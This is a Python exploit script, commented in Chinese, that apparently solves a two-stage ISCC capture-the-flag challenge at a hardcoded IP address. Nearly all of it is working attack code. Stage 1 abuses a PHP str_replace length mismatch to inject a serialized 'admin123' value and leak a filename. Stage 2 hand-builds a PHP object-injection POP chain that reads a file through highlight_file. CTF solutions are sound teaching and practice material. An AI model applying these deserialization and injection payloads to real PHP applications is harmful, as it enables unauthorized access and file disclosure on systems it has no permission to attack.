#!/usr/bin/env python3
"""
数字古墓 - 完整利用脚本
第一关：str_replace 长度错位 → 注入 admin123 → 获取文件名
第二关：POP 链 → highlight_file 读取 flag
"""

import re, sys
import requests

HOST = "http://39.105.213.28:10026"
PAT_FLAG = re.compile(rb"(ISCC\{[^}]+\})")

# ---- PHP 序列化辅助 ----

def _str(s):
    return f's:{len(s)}:"{s}";'

def _obj(clz, props):
    inner = "".join(_str(k) + _val(v) for k, v in props)
    return f'O:{len(clz)}:"{clz}":{len(props)}:{{{inner}}}'

def _val(x):
    if x is None:
        return "N;"
    if isinstance(x, str):
        return _str(x)
    if isinstance(x, int):
        return f'i:{x};'
    if isinstance(x, dict):
        items = "".join(_str(k) + _val(v) for k, v in x.items())
        return f'a:{len(x)}:{{{items}}}'
    if isinstance(x, (list, tuple)):
        parts = "".join(_val(i) + _val(v) for i, v in enumerate(x))
        return f'a:{len(x)}:{{{parts}}}'
    if hasattr(x, "_ser"):
        return x._ser()
    raise Exception(f"bad type: {type(x)}")

class PObj:
    """PHP object serialization wrapper."""
    def __init__(self, c, props):
        self.c = c
        self.props = props
    def _ser(self):
        return _obj(self.c, self.props)

# ---- Stage 1 ----

def get_filename():
    payload = "amgoinvc" * 4
    inj = '";s:1:"y";s:8:"admin123";}'
    r = requests.get(f"{HOST}/rune_trial.php",
                     params={"d": payload, "p": inj},
                     timeout=15)
    found = re.findall(rb"([A-Za-z0-9_-]+\.txt)", r.content)
    if not found:
        raise RuntimeError("stage1: no filename")
    return found[-1].decode()

# ---- Stage 2 ----

def make_chain(txtfile):
    """Build the nested POP chain payload."""
    reader = PObj("RitualEngine", [
        ("\x00*\x00settings", None),
        ("target", txtfile),
        ("callback", None),
    ])
    cb = _val([reader, "view"])
    invoker = PObj("RitualEngine", [
        ("\x00*\x00settings", None),
        ("target", None),
        ("callback", cb),
    ])
    blade = PObj("Keystone", [("center", invoker)])
    inner = PObj("GateSentinel", [
        ("object", None),
        ("tool", {"blade": blade}),
    ])
    outer = PObj("GateSentinel", [
        ("object", inner),
        ("tool", None),
    ])
    return _val(outer)

def get_flag(txtfile):
    data = {"data": make_chain(txtfile)}
    r = requests.post(f"{HOST}/mechanism_chamber.php",
                      data=data, timeout=15)
    m = PAT_FLAG.search(r.content)
    if not m:
        raise RuntimeError("stage2: no flag")
    return m.group(1).decode()

# ---- Main ----

def main():
    print("[*] Stage 1: exploiting str_replace trap...")
    fn = get_filename()
    print(f"[+] filename: {fn}")

    print("[*] Stage 2: sending POP chain...")
    flag = get_flag(fn)
    print(f"[+] FLAG: {flag}")

if __name__ == "__main__":
    main()
